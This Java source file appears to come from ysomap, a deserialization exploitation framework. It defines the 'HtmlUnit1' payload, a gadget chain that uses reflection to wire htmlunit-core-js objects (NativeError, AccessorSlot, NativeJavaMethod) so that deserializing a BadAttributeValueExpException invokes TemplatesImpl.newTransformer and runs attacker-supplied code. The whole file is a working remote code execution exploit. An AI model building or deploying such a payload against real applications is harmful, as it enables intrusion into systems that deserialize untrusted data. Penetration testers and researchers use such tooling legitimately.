package ysomap.payloads.java.htmlunit;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import net.sourceforge.htmlunit.corejs.javascript.*;
import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.TemplatesImplBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.ReflectionHelper;
import ysomap.payloads.AbstractPayload;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;

/**
 * @author wh1t3p1g
 * @since 2022/10/31
 */
@Payloads
@Targets({Targets.JDK})
@Require(bullets = {"TemplatesImplBullet"}, param = false)
@Dependencies({"net.sourceforge.htmlunit:htmlunit-core-js:*"})
@Authors({ Authors.WH1T3P1G })
public class HtmlUnit1 extends AbstractPayload<Object> {

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return TemplatesImplBullet.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        Class nativeErrorClass = Class.forName("net.sourceforge.htmlunit.corejs.javascript.NativeError");
        Constructor nativeErrorConstructor = nativeErrorClass.getDeclaredConstructor();
        ReflectionHelper.setAccessible(nativeErrorConstructor);
        IdScriptableObject idScriptableObject = (IdScriptableObject) nativeErrorConstructor.newInstance();

        AccessorSlot slot = ReflectionHelper.createWithoutConstructor(AccessorSlot.class);
        ReflectionHelper.setFieldValue(slot, "name", "name");
        Object getter = ReflectionHelper.createWithoutConstructor("net.sourceforge.htmlunit.corejs.javascript.AccessorSlot$FunctionGetter");

        Method newTransformer = TemplatesImpl.class.getDeclaredMethod("newTransformer");

        NativeJavaMethod target = new NativeJavaMethod(newTransformer, "newTransformer");
        ReflectionHelper.setFieldValue(getter, "target", target);
        ReflectionHelper.setFieldValue(slot, "getter", getter);

        Object slotMap = ReflectionHelper.newInstance("net.sourceforge.htmlunit.corejs.javascript.SlotMapContainer", new Class[]{int.class}, 1);
        HashSlotMap map = new HashSlotMap();
        map.add(slot);
        ReflectionHelper.setFieldValue(slotMap, "map", map);
        ReflectionHelper.setFieldValue(idScriptableObject, "slotMap", slotMap);
        Object prototypeObject = new NativeJavaObject();
        ReflectionHelper.setFieldValue(prototypeObject, "javaObject", obj);
        ReflectionHelper.setFieldValue(idScriptableObject, "prototypeObject", prototypeObject);
        Context context = Context.enter();
        NativeObject dummyScope = (NativeObject) context.initStandardObjects();
        ReflectionHelper.setFieldValue(prototypeObject, "parent", dummyScope);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        ReflectionHelper.setFieldValue(badAttributeValueExpException, "val", idScriptableObject);
        return badAttributeValueExpException;
    }
}
